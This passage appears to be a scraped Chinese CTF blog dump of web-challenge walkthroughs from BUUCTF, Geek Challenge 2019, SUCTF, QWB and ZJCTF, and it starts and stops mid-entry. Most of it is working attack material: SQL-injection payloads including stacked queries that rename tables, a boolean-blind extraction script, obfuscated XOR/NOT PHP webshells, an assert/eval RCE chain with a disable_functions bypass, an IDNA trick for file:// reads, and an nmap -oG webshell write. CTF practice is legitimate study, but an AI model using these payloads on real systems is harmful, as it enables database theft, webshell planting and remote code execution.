MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5 解码之后： c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw== 再通过base64解码： select * from user where username = '$name' 由此可见，在username处存在注入点。用常规的注入测试一下： ' union select 1,2,3%23 提示wrong user，接着我们把admin分别替换1、2、3的位置，发现替换2的时候报错变成wrong pass说明了username就是在第二个位置，原题提示了md5，肯定是对密码进行了哈希，那么可以推断，3处应该替换为密码的哈希值。那么我们利用上面的语句，再把随便输入的密码的md5值替换到3的位置，在后头就能构成满足后端判断的查询语句了。 解题随便找个密码以及密码的md5值，这里用的是123456/e10adc3949ba59abbe56e057f20f883e，最终payload如下： ' union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'%23 username处输入payload，password输入123456即可拿到flag。 [SUCTF 2018]GetShell利用异或构造webshell，参考上一篇博客的知识点。fuzz脚本 &lt;?phpheader('Content-Type: text/html; charset=utf-8');$str = '当我站在山顶上俯瞰半个鼓浪屿和整个厦门的夜空的时候，我知道此次出行的目的已经完成了，我要开始收拾行李，明天早上离开这里。前几天有人问我，大学四年结束了，你也不说点什么？乌云发生了一些事情，所有人都缄默不言，你也是一样吗？你逃到南方，难道不回家了吗？当然要回家，我只是想找到我要找的答案。其实这次出来一趟很累，晚上几乎是热汗淋漓回到住处，厦门的海风伴着妮妲路过后带来的淅淅沥沥的小雨，也去不走我身上任何一个毛孔里的热气。好在旅社的生活用品一应俱全，洗完澡后我爬到屋顶。旅社是一个老别墅，说起来也不算老，比起隔壁一家旧中国时期的房子要豪华得多，竖立在笔山顶上与厦门岛隔海相望。站在屋顶向下看，灯火阑珊的鼓浪屿街市参杂在绿树与楼宇间，依稀还可以看到熙熙攘攘的游客。大概是夜晚渐深的缘故，周围慢慢变得宁静下来，我忘记白天在奔波什么，直到站在这里的时候，我才知道我寻找的答案并不在南方。当然也不在北方，北京的很多东西让我非常丧气，包括自掘坟墓的中介和颐指气使的大人们；北京也有很多东西让我喜欢，我喜欢颐和园古色古香的玉澜堂，我喜欢朝阳门那块“永延帝祚”的牌坊，喜欢北京鳞次栉比的老宅子和南锣鼓巷的小吃。但这些都不是我要的答案，我也不知道我追随的是什么，但想想百年后留下的又是什么，想想就很可怕。我曾经为了吃一碗臭豆腐，坐着优步从上地到北海北，兴冲冲地来到那个垂涎已久的豆腐摊前，用急切又害羞的口吻对老板说，来两份量的臭豆腐。其实也只要10块钱，吃完以后便是无与伦比的满足感。我记得那是毕业设计审核前夕的一个午后，五月的北京还不算炎热，和煦的阳光顺着路边老房子的屋檐洒向大地，但我还是不敢站在阳光下，春天的燥热难耐也绝不输给夏天。就像很多人冷嘲热讽的那样，做这一行谁敢把自己完全曝光，甭管你是黑帽子白帽子还是绿帽子。生活在那个时候还算美好，我依旧是一个学生，几天前辞别的同伴还在朝九晚五的工作，一切都照旧运行，波澜不远走千里吃豆腐这种理想主义的事情这几年在我身上屡屡发生，甚至南下此行也不例外。一年前的这个时候我许过一个心愿，在南普陀，我特为此来还愿。理想化、单纯与恋旧，其中单纯可不是一个多么令人称赞的形容，很多人把他和傻挂钩。“你太单纯了，你还想着这一切会好起来”，对呀，在男欢女爱那些事情上，我可不单纯，但有些能让人变得圆滑与世故的抉择中，我宁愿想的更单纯一些。去年冬天孤身一人来到北京，放弃了在腾讯做一个安逸的实习生的机会，原因有很多也很难说。在腾讯短暂的实习生活让我记忆犹新，我感觉这辈子不会再像一个小孩一样被所有人宠了，这些当我选择北漂的时候应该就要想到的。北京的冬天刺骨的寒冷，特别是2015年的腊月，有几天连续下着暴雪，路上的积雪一踩半步深，咯吱咯吱响，周遭却静的像深山里的古刹。我住的小区离公司有一段距离，才下雪的那天我甚至还走着回家。北京的冬天最可怕的是寒风，走到家里耳朵已经硬邦邦好像一碰就会碎，在我一头扎进被窝里的时候，我却慢慢喜欢上这个古都了。我想到《雍正皇帝》里胤禛在北京的鹅毛大雪里放出十三爷，那个拼命十三郎带着令牌取下丰台大营的兵权，保了大清江山盛世的延续与稳固。那一夜，北京的漫天大雪绝不逊于今日，而昔人已作古，来者尚不能及，多么悲哀。这个古都承载着太多历史的厚重感，特别是下雪的季节，我可以想到乾清宫前广场上千百年寂寞的雕龙与铜龟，屋檐上的积雪，高高在上的鸱吻，想到数百年的沧桑与朝代更迭。雪停的那天我去了颐和园，我记得我等了很久才摇摇摆摆来了一辆公交车，车上几乎没有人，司机小心翼翼地转动着方向盘，在湿滑的道路上缓慢前行。窗外白茫茫一片，阳光照在雪地上有些刺眼，我才低下头。颐和园的学生票甚至比地铁票还便宜。在昆明湖畔眺望湖面，微微泛着夕阳霞光的湖水尚未结冰，踩着那些可能被御碾轧过的土地，滑了无数跤，最后只能扶着湖边的石狮子叹气，为什么没穿防滑的鞋子。昆明湖这一汪清水，见证了光绪皇帝被囚禁十载的蹉跎岁月，见证了静安先生誓为先朝而自溺，也见证了共和国以来固守与开放的交叠。说起来，家里有本卫琪著的《人间词话典评》，本想买来瞻仰一下王静安的这篇古典美学巨著，没想到全书多是以批判为主。我自诩想当文人的黑客，其实也只是嘴里说说，真到评说文章是非的时候，我却张口无词。倒是誓死不去发，这点确实让我无限感慨：中国士大夫的骨气，真的是从屈原投水的那一刻就奠定下来的。有句话说，古往今来中国三大天才死于水，其一屈原，其二李白，其三王国维。卫琪对此话颇有不服，不纠结王国维是否能够与前二者相提并论，我单喜欢他的直白，能畅快评说古今词话的人，也许无出其右了吧。人言可畏、人言可畏，越到现代越会深深感觉到这句话的正确，看到很多事情的发展往往被舆论所左右，就越羡慕那些无所畏惧的人，不论他们是勇敢还是自负。此间人王垠算一个，网络上人们对他毁誉参半，但确实有本事而又不矫揉做作，放胆直言心比天高的只有他一个了。那天在昆明湖畔看过夕阳，直到天空变的无比深邃，我才慢慢往家的方向走。耳机放着后弦的《昆明湖》，不知不觉已经十年了，不知道这时候他有没有回首望望自己的九公主和安娜，是否还能够“泼墨造一匹快马，追回十年前姑娘”。后来，感觉一切都步入正轨，学位证也顺利拿到，我匆匆告别了自己的大学。后来也遇到了很多事，事后有人找我，很多人关心你，少数人可能不是，但出了学校以后，又有多少人和事情完全没有目的呢？我也考虑了很多去处，但一直没有决断，倒有念怀旧主，也有妄自菲薄之意，我希望自己能做出点成绩再去谈其他的，所以很久都是闭门不出，琢磨东西。来到厦门，我还了一个愿，又许了新的愿望，希望我还会再次来还愿。我又来到了上次没住够的鼓浪屿，订了一间安静的房子，只有我一个人。在这里，能听到的只有远处屋檐下鸟儿叽叽喳喳的鸣叫声，远处的喧嚣早已烟消云散，即使这只是暂时的。站在屋顶的我，喝下杯中最后一口水。清晨，背着行李，我乘轮渡离开了鼓浪屿，这是我第二次来鼓浪屿，谁知道会不会是最后一次。我在这里住了三天，用三天去寻找了一个答案。不知不觉我又想到辜鸿铭与沈子培的那段对话。“大难临头，何以为之？”“世受国恩，死生系之。”';for($i=0; $i&lt;mb_strlen($str, 'utf-8'); $i++){ $st = mb_substr($str, $i,1, 'utf-8'); $a = ~($st); $b = $a[1]; #取汉字的第一位 if($b==$_GET['a']) #$_GET['a']想要得到的字符 { echo $st;exit; } }?&gt; 构造webshell &lt;?php $__=[]; $___=[]; $_=$__==$___;//true = 1 用作索引 $__=~(瞰); $___=$__[$_];//a $__=~(北); $___.=$__[$_].$__[$_];//ss $__=~(的); $___.=$__[$_];//e $__=~(半); $___.=$__[$_];//r $__=~(拾); $___.=$__[$_];//t $____=~(~(_));//_ $__=~(说); $____.=$__[$_];//P $__=~(小); $____.=$__[$_];//O $__=~(次); $____.=$__[$_];//S $__=~(站); $____.=$__[$_];//T $_=$$____; $___($_[_]); ?&gt; 这题还没复现成功，后续会补充…","link":"/2020/02/15/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A2/"},{"title":"极客大挑战题目解析","text":"这里是极客大挑战五个sql注入题目的解析合集，都是常用的注入姿势，入门到基础级的。 [极客大挑战 2019]EasySQL万能密码登录管理员账户即可，这里注意一下，万能密码用的时候注意是字符型还是整形，这个题是字符型，即： -1' or '1'='1 如果是整形，则用万能密码： -1' or 1=1 万能密码还有很多，可以参考网上的信息，这里有一个：https://www.cnblogs.com/pass-A/p/11134988.html [极客大挑战 2019]LoveSQL考察常见的万能密码登录以及union select注入 题目分析进入题目看到是一个登录框，经过尝试发现字符型的万能密码1' or '1'='1可以登录，并且在username和password处都存在注入点，然后进行常规的注入就行了。 解题爆库： /check.php?username=admin&amp;password=admin'%20union%20select%201%2C2%2Cgroup_concat(schema_name)+from+information_schema.schemata%23 爆表名： /check.php?username=admin&amp;password=admin'%20union%20select%201%2C2%2Cgroup_concat(table_name)+from+information_schema.tables%20where%20table_schema%3Ddatabase()%20%23 可以看到一个表名l0ve1ysq1，flag应该在其中，那么就看一下这个表包含的列爆列名： /check.php?username=admin&amp;password=admin'%20union%20select%201%2C2%2Cgroup_concat(column_name)%20from%20information_schema.columns%20where%20table_name%3D'l0ve1ysq1'%20%23 看到存在password列，flag应该在其中查字段： /check.php?username=admin&amp;password=admin'%20union%20select%201%2C2%2Cgroup_concat(password)%20from%20l0ve1ysq1%23 如图，成功拿到flag。 [极客大挑战 2019]BabySQL考察双写绕过 题目分析在登陆窗口，利用万能密码的时候直接1' or '1'='1发现不行，但是1' oorr '1'='1可以，由此猜测考察双写绕过。通过测试发现了or、from、union、select、where被替换为空了，因此需要利用双写绕过。 解题首先利用双写爆库： /check.php?username=admin&amp;password=admin' uniounionn selecselectt 1,2,group_concat(schema_name)%20frfromom%20infoorrmation_schema.schemata%20%23 然后爆表名： /check.php?username=admin&amp;password=admin' uniounionn selecselectt 1,2,group_concat(table_name)%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema%3Ddatabase()%23 爆列名： /check.php?username=admin&amp;password=admin' uniounionn selecselectt 1,2,group_concat(column_name)%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_name%3D'b4bsql'%23 拿flag： /check.php?username=admin&amp;password=admin' uniounionn selecselectt 1,2,group_concat(passwoorrd)%20frfromom%20b4bsql%23 [极客大挑战 2019]HardSQL主要考察报错注入，同时还考察对空格过滤的绕过，以及利用left和right截取函数读取完整flag。关于报错注入的讲解，我的博客里还有，在标签里可以找到。 解题本题学到了一个新点：用^代替空格来连接updatexml函数。首先拿库名： /check.php?username=admin&amp;password=admin'^updatexml(1,concat(0x7e,(select(database())),0x7e),1)%23 注意这里的#一定要用urlencode之后的%23，否则会提示语法错误，也没搞清楚原因，可以参考一下这里，建议在对url进行操作的时候还是都先编码一下。拿到库名：爆表名： /check.php?username=admin&amp;password=admin'^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like('geek'))),0x7e),1)%23 这里用到了like，可以参考一下这里查列名 /check.php?username=admin&amp;password=admin'^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like('H4rDsq1'))),0x7e),1) 拿flag，由于updtexml最多显示32个字符的长度，导致flag显示不全。可以用substr截取，但是发现substr被过滤了，然后参考网上学到了用left和right截取函数分两次把完整的flag查出来了。 /check.php?username=admin&amp;password=admin'^updatexml(1,concat(0x7e,(select(left(password,30))from(H4rDsq1)),0x7e),1)%23/check.php?username=admin&amp;password=admin'^updatexml(1,concat(0x7e,(select(left(password,30))from(H4rDsq1)),0x7e),1)%23 [极客大挑战 2019]FinalSQL考察布尔盲注 题目分析进入题目发现多了五个按钮，并且提示中有SQL盲注的字样，猜测就是考它的了。这里可以的地方就是五个按钮了，点击之后发现时用di传参，注入点多半在这里。由于这里传的值是1-5，猜测是布尔盲注，便用常用的姿势测试一下：构造id=1^1和id=1^0发现回显不同，前者返回ERROR!!!(注意这里的返回跟其他错误不一样，其他错误回显是ERROR!)后者是id=1的页面，说明了就是布尔盲注。关于布尔盲注可以参考这里这里需要用到的函数如下： Length（）函数 返回字符串的长度Substr（）截取字符串Ascii（）返回字符的ascii码sleep(n)：将程序挂起一段时间 n为n秒if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句 那么构造类似id=1^(length(database())&gt;10)^1的语句，便可以爆破出数据库名的长度，然后再利用id=1^(ascii(substr((select(database())),1,1))&gt;100)^1payload来爆破出数据库名，同理可以爆破出表名和最后的flag。布尔盲注一般都借助python脚本来解，大致的代码逻辑是一样的，这里贴出利用二分爆破的脚本，效率比较高： import reimport requestsimport string url = \"http://127.0.0.1/search.php\"flag = ''def payload(i,j): # sql = \"1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1\"%(i,j) #数据库名字 # sql = \"1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='geek'),%d,1))&gt;%d)^1\"%(i,j) #表名 # sql = \"1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))&gt;%d)^1\"%(i,j) #列名 sql = \"1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1\"%(i,j) data = {\"id\":sql} r = requests.get(url,params=data) # print (r.url) if \"Click\" in r.text: res = 1 else: res = 0 return res def exp(): global flag for i in range(1,10000) : print(i,':') low = 31 high = 127 while low &lt;= high : mid = (low + high) // 2 res = payload(i,mid) if res : low = mid + 1 else : high = mid - 1 f = int((low + high + 1)) // 2 if (f == 127 or f == 31): break # print (f) flag += chr(f) print(flag) exp()print('flag=',flag) 这个题比较坑的就是要读的内容很多，flag也在后面，加上服务器性能和网络性能的原因一直读不全内容，后来多次测试，flag大概在第170个字符后面，将i的起始大小改一下就行了。脚本也可以用于其他布尔盲注的题目，根据题目特点更改即可。 [极客大挑战 2019]RCE ME考察利用PHP 7函数解析特性绕过正则巧取webshell、利用环境变量绕过functions_disable。 题目分析进入题目给出如下源码： &lt;?phperror_reporting(0);if(isset($_GET['code'])){ $code=$_GET['code']; if(strlen($code)&gt;40){ die(\"This is too Long.\"); } if(preg_match(\"/[A-Za-z0-9]+/\",$code)){ die(\"NO.\"); } @eval($code);}else{ highlight_file(__FILE__);}// ?&gt; 可以看到，需要绕过长度判断和正则，并且这个正则把所有字母和数字都在其中。查资料得知可以利用PHP 7的解析特性来绕过。 这就说明： phpinfo() #php5、php7可执行(phpinfo)() #php7可执行 另外，之前刷题的一篇博客写到过，我们可以利用取反~来绕过对字符的过滤。在php7的环境中，我们可以使用编码转换等形式，将phpinfo转换成一些不可见字符再传入到题目中，这样不仅绕过了正则的匹配，也成功的执行了函数，这里进行编码转换的方式有很多种，常用的有利用^和~ 生成的不可见字符，这里更倾向于使用~求反运算符。 可以利用如下代码生成payload： &lt;?php $shell = phpinfo; echo urlencode(~$shell);?&gt;%8F%97%8F%96%91%99%90 效果如下： 同时也可以看到禁用了很多函数，而assert不再其中，因此可以利用它来拿到shell，先放着。 下一步利用php的函数看一下目录： print_r(scandir('./')); 编码之后为： %8F%8D%96%91%8B%A0%8D # print_r%8C%9C%9E%91%9B%96%8D # scandir 构造如下payload读取当前目录内容： code=(~%8F%8D%96%91%8B%A0%8D)((~%8C%9C%9E%91%9B%96%8D)((&quot;./&quot;))); 根目录呢？ 直接用readfile()读取flag文件是读不到的，因为是个二进制文件，那么就需要拿到shell执行readflag来拿到flag了。 而这题拿到shell可以利用前面提到的编码来获取，也可以用之前讲过的利用部分汉字异或来构造POST或GET传参来拿到shell，然后需要bypass functions_disable了。 解题利用如下payload拿到shell： code=${%fe%fe%fe%fe^%a1%b9%bb%aa}[_](${%fe%fe%fe%fe^%a1%b9%bb%aa}[__]);&amp;_=assert&amp;__=eval($_POST[%27a%27]) 然后蚁剑连上，接下来就是利用环境变量bypass了，最近在不断收集bypass的exp，今天又找到一个。 我们把exp中的bypass_disablefunc_x64.so和bypass_disablefunc.php写入到/var/tmp路径下，然后利用如下payload访问： code=${%fe%fe%fe%fe^%a1%b9%bb%aa}[_](${%fe%fe%fe%fe^%a1%b9%bb%aa}[__]);&amp;_=assert&amp;__=include(%27/var/tmp/bypass_disablefunc.php%27)&amp;cmd=/readflag&amp;outpath=/tmp/result&amp;sopath=/var/tmp/bypass_disablefunc_x64.so","link":"/2020/02/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98SQL%E6%B3%A8%E5%85%A5%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90/"},{"title":"BUUCTF-web刷题Ⅱ","text":"刷题刷不停，继续刷！👾👾👾 [SUCTF 2019]Pythonginx考察知识考察Black Hat2019的一个议题：在unicode中字符℀(U+2100)，当利用IDNA处理此字符时，会将℀变成a/c，因此当你访问此url时，dns服务器会自动将url重定向到另一个网站。如果服务器引用前端url时，只对域名做了限制，那么通过这种方法，我们就可以轻松绕过服务器对域名的限制。关于INDA和UIF-8的漏洞：https://www.cnblogs.com/cimuhuashuimu/p/11490431.html此类的字符还有： U+2100, ℀U+2101, ℁U+2105, ℅U+2106, ℆U+FF0F, ／U+2047, ⁇U+2048, ⁈U+2049, ⁉U+FE16,︖U+FE56, ﹖U+FF1F, ？U+FE5F, ﹟U+FF03, ＃U+FE6B, ﹫U+FF20, ＠相信总会用到的 参考Black Hat2019的PPT：https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf 题目分析进入题目，给了如下的源码 from flask import Flask, Blueprint, request, Response, escape ,render_templatefrom urllib.parse import urlsplit, urlunsplit, unquotefrom urllib import parseimport urllib.requestapp = Flask(__name__)# Index@app.route('/', methods=['GET'])def app_index(): return render_template('index.html')@app.route('/getUrl', methods=['GET', 'POST'])def getUrl(): url = request.args.get(\"url\") host = parse.urlparse(url).hostname if host == 'suctf.cc': return \"我扌 your problem? 111\" parts = list(urlsplit(url)) host = parts[1] if host == 'suctf.cc': return \"我扌 your problem? 222 \" + host newhost = [] for h in host.split('.'): newhost.append(h.encode('idna').decode('utf-8')) parts[1] = '.'.join(newhost) #去掉 url 中的空格 finalUrl = urlunsplit(parts).split(' ')[0] host = parse.urlparse(finalUrl).hostname if host == 'suctf.cc': return urllib.request.urlopen(finalUrl).read() else: return \"我扌 your problem? 333\"if __name__ == \"__main__\": app.run(host='0.0.0.0', port=80) 我们看到getUrl()会对传入的url做多层处理和过滤：第一层处理及过滤： host = parse.urlparse(url).hostnameif host == 'suctf.cc': return \"我扌 your problem? 111\" 这里host = parse.urlparse(url).hostname返回传入的url的主机名，这里urlparse是将url字符串拆分为组件，可参考：https://www.cnblogs.com/jiumo/p/11143741.html在本机测试效果如下： &gt;&gt;&gt; from urllib.parse import urlparse&gt;&gt;&gt; urlparse('http://www.baidu.com/index.php')ParseResult(scheme='http', netloc='www.baidu.com', path='/index.php', params='', query='', fragment='')&gt;&gt;&gt; urlparse('http://www.baidu.com/index.php').hostname'www.baidu.com' 这里不会对url中的类似于℀的字符做处理，测试效果： &gt;&gt;&gt; urlparse('http://www.baidu.℀om/index.php').hostname'www.baidu.℀om' 因此借助INDA漏洞构造的url可以通过这一步的过滤。第二层处理及过滤： parts = list(urlsplit(url))host = parts[1]if host == 'suctf.cc': return \"我扌 your problem? 222 \" + host urlsplit是将url进行分割，测试： &gt;&gt;&gt; from urllib.parse import urlsplit&gt;&gt;&gt; urlsplit('http://www.baidu.com/index.php')SplitResult(scheme='http', netloc='www.baidu.com', path='/index.php', query='', fragment='')&gt;&gt;&gt; urlsplit('http://www.baidu.com/index.php')[1]'www.baidu.com' 此处利用了一个CVE：urlsplit不处理 NFKC 标准化(用 Punycode/IDNA编码的URL使用NFKC规范化来分解字符)，因此对℀类的字符也是处理不了的： &gt;&gt;&gt; urlsplit('http://www.baidu.℀om/index.php')[1]'www.baidu.℀om' 绕过前两层过滤，到第三层处理： newhost = []for h in host.split('.'): newhost.append(h.encode('idna').decode('utf-8'))parts[1] = '.'.join(newhost) 我们发现，这里是在url的.处进行分割，并加入到newhost[]数组中，但是加入数组之前会继续INDA编码然后UTF-8解码，那么在此处℀类的字符便会被解析为a/c，我们利用此漏洞便可以构造能打入服务器拿flag的payload了。 解题我们从前面的代码看到，构造的url的域名需要绕过前两层host == 'suctf.cc'的判断，并且要满足第三层的host == 'suctf.cc'，那么我们便可以构造域名：suctf.c℆sr便可以绕过对域名的判断。但是现在我们不知道flag文件在哪，但是题目给了提示： &lt;!-- Dont worry about the suctf.cc. Go on! --&gt;&lt;!-- Do you know the nginx? --&gt; 提示我们是基于nginx架构的服务器，那肯定与其配置文件相关这里补充知识： Nginx重要文件位置:配置文件存放目录：/etc/nginx主配置文件：/etc/nginx/conf/nginx.conf管理脚本：/usr/lib64/systemd/system/nginx.service模块：/usr/lisb64/nginx/modules应用程序：/usr/sbin/nginx程序默认存放位置：/usr/share/nginx/html日志默认存放位置：/var/log/nginx配置文件目录为：/usr/local/nginx/conf/nginx.conf 我们读取nignx.conf应该能找到flag文件的位置，构造payload： file://suctf.c℆sr/local/nginx/conf/nginx.conf 利用file协议读取nginx.conf内容如下： server { listen 80; location / { try_files $uri @app; } location @app { include uwsgi_params; uwsgi_pass unix:///tmp/uwsgi.sock; } location /static { alias /app/static; } # location /flag { # alias /usr/fffffflag; # } } 拿到flag文件的位置之后，构造最终payload： /getUrl?url=file://suctf.c%E2%84%86sr/fffffflag 这里注意℆需要进行url编码。 拓展一下：python的urlsplit函数其实是比较不完善的，还存在urlsplit NFKD 标准化漏洞，以后遇到的时候需要多加注意。 [极客大挑战 2019]Http考察http协议的题目，常见也简单。 解题查看源码发现一个Secret.php的链接，进去之后提示：伪造Refer头即可，伪造之后又提示：伪造UA头即可，然后提示需要来自本地：伪造IP即可拿到flag这个地方可以伪造多处，可以伪造x-forwarded-for也可以伪造client-ip，还可以伪造host头，有些时候甚至把三个都伪造上，之前打比赛遇到一个题目就是，巨坑… 伪造协议头可以通过BP抓包改包，当然有更方便的方法，这里推荐一个火狐/谷歌的插件Header Editor方便好用。 [强网杯 2019]随便注考察堆叠注入注入原理：在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？答案是会的，这也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如： 用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。 题目分析进入题目可以看到一个提示框，进行注入测试，1'的时候不回显，1'#则回显，说明存在sql注入，order by语句得知有两个字段，但是用union select组合查询的时候提示了过滤的情况：可以看到，常用的注入语句基本全被过滤了，网上参考得知是堆叠注入。 解题利用堆叠注入进行注入： 爆库：1';show databases;#爆表：1';show tables# 查表回显的结果如下：。我们看到有一个words表和一个1919810931114514表，flag应该在1919810931114514中没错了，看一下： 1';show columns from `1919810931114514` //注意以纯数字作为表名，查表的时候需要用反引号 现在，我们知道flag在1919810931114514表了，但是用去查询的字段都被过滤了，所以需要用其他的方法来获取flag。我们可以看到，在输入1或者2的时候，都会返回一个字符串，因此猜测内部查询语句应该是默认匹配words库的，查询语句也就类似于select id, data from words where id =，因此我们可以把1919810931114514表改名为words表，并且加入id列，同时将flag列改为data列，如此一来，我们查询1' or 1=1#就能拿到flag了。最终构造payload： 1’;rename table words to word1;rename table 1919810931114514 to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);# 然后1' or 1=1即可拿到flag。 [SUCTF 2019]EasySQL也是考察堆叠注入，但是与上题不同，本题突破点在于：mysql中通过set sql_mode=PIPES_AS_CONCAT可以将||视为字符串的连接操作符而非或运算符，利用语句堆叠设置这个环境变量，然后再通过||拼接查询flag即可。 题目分析进入题目，和上题一样是一个查询框，可以拿到源码： &lt;?php session_start(); include_once \"config.php\"; $post = array(); $get = array(); global $MysqlLink; //GetPara(); $MysqlLink = mysqli_connect(\"localhost\",$datauser,$datapass); if(!$MysqlLink){ die(\"Mysql Connect Error!\"); } $selectDB = mysqli_select_db($MysqlLink,$dataName); if(!$selectDB){ die(\"Choose Database Error!\"); } foreach ($_POST as $k=&gt;$v){ if(!empty($v)&amp;&amp;is_string($v)){ $post[$k] = trim(addslashes($v)); } } foreach ($_GET as $k=&gt;$v){ } } //die(); ?&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/ a&gt;&lt;form action=\"\" method=\"post\"&gt;&lt;input type=\"text\" name=\"query\"&gt;&lt;input type=\"submit\"&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php if(isset($post['query'])){ $BlackList = \"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\\\"\"; //var_dump(preg_match(\"/{$BlackList}/is\",$post['query'])); if(preg_match(\"/{$BlackList}/is\",$post['query'])){ //echo $post['query']; die(\"Nonono.\"); } if(strlen($post['query'])&gt;40){ die(\"Too long.\"); } $sql = \"select \".$post['query'].\"||flag from Flag\"; mysqli_multi_query($MysqlLink,$sql); do{ if($res = mysqli_store_result($MysqlLink)){ while($row = mysqli_fetch_row($res)){ print_r($row); } } }while(@mysqli_next_result($MysqlLink)); } ?&gt; 看到 mysql_multi_query()得知可以堆叠注入，这里关注查询语句$sql = &quot;select &quot;.$post['query'].&quot;||flag from Flag&quot;;可以看到，查询语句是将我们传入的语句与||flag from Flag拼接在一起了，这里补充知识： 在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode模式：pipes_as_concat 来实现oracle 的一些功能。 因此我们通过堆叠注入设置sql_mode，然后再查询即可。 解题构造最终payload：1;set sql_mode=PIPES_AS_CONCAT;select 1 非预期解：直接构造payload为*,1即可拿到flag 字符串或时前面的数字时结果为1则返回1，为0则返回0，效果跟直接*一样。 [BUUCTF 2018]Online Tool考察namp的一个命令-oG，以及escapeshellarg()和escapeshellarg()函数合起来使用造成的漏洞。 题目分析首先看到代码： &lt;?phpif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) { $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];}if(!isset($_GET['host'])) { highlight_file(__FILE__);} else { $host = $_GET['host']; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(\"glzjin\". $_SERVER['REMOTE_ADDR']); echo 'you are in sandbox '.$sandbox; @mkdir($sandbox); chdir($sandbox); echo system(\"nmap -T5 -sT -Pn --host-timeout 2 -F \".$host);} 我们看到，代码主要是通过利用nmap的命令拼接上我们的输入来执行，参考别人的题解得知namp的一个参数-oG可以向目标机器中写入文件，通过这个参数，我们便可以向目标机器写入一个小马来连接。但是我们只能从host参数来写入内容，那么我们写入的小马代码便会被escapeshellarg()和escapeshellarg()做处理，即将host中包含的字符转义，便可以影响小马的上传，因此需要利用它们结合使用存在的漏洞来绕过。这里可以参考：https://paper.seebug.org/164/即传入的参数内容中包含'则会造成漏洞，例如： 传入的参数是：172.17.0.2' -v -d a=1 经过escapeshellarg处理后变成了'172.17.0.2'\\'' -v -d a=1'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。 经过escapeshellcmd处理后变成'172.17.0.2'\\\\'' -v -d a=1\\'，这是因为escapeshellcmd对\\以及最后那个不配对儿的'进行了转义 最后执行的命令是curl '172.17.0.2'\\\\'' -v -d a=1\\'，由于中间的\\\\被解释为\\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\\ -v -d a=1'，即向172.17.0.2\\发起请求，POST数据为a=1'。 这里我们是利用namp执行命令，那么需要了解一些namp的基本知识：namp -PS 127.0.0.1与namp -PS '' 127.0.0.1与nmap -PS '&quot; &quot;' 127.0.0.1 &quot; &quot;效果是一样的。 解题构造payload： ?host=' &lt;?php @eval($_POST[\"hack\"]);?&gt; -oG hack.php ' 写入之后返回了小马存储的路径：然后去蚁剑连接即可。 [ZJCTF 2019]NiZhuanSiWei考察file_get_contents的绕过，以及反序列化。补充知识：file_get_contents的绕过 1、使用php://input伪协议绕过 ①将要GET的参数?xxx=php://input ②用post方法传入想要file_get_contents()函数返回的值2、用data://伪协议绕过 ①将url改为：?xxx=data://text/plain;base64,想要file_get_contents()函数返回的值的base64编码 ②或者将url改为：?xxx=data:text/plain,(url编码的内容)3、利用远程文件读取绕过 题目分析进入题目之后，给出了一段代码： &lt;?php $text = $_GET[\"text\"];$file = $_GET[\"file\"];$password = $_GET[\"password\"];if(isset($text)&amp;&amp;(file_get_contents($text,'r')===\"welcome to the zjctf\")){ echo \"&lt;br&gt;&lt;h1&gt;\".file_get_contents($text,'r').\"&lt;/h1&gt;&lt;/br&gt;\"; if(preg_match(\"/flag/\",$file)){ echo \"Not now!\"; exit(); }else{ include($file); //useless.php $password = unserialize($password); echo $password; }}else{ highlight_file(__FILE__);}?&gt; 通过审计代码可知：需要GET方式上传三个参数text、file、password，并且三个参数需要满足： text参数传入的值会用file_get_contents去访问，初步猜测是远程文件读取，后来测试发现这里不行，需要用伪协议； file参数可以传入文件名，这个文件会被include()包含，看到这猜测肯定有文件包含，并且提示了useless.php，肯定是要看它的代码的； password会进行反序列化，还没看出他的用处。 解题首先构造payload： /?text=data:text/plain,welcome to the zjctf&amp;file=php://filter/convert.base64-encode/resource=useless.php&amp;passwprd=1 成功读取到useless.php的代码，如下： &lt;?php class Flag{ //flag.php public $file; public function __tostring(){ if(isset($this-&gt;file)){ 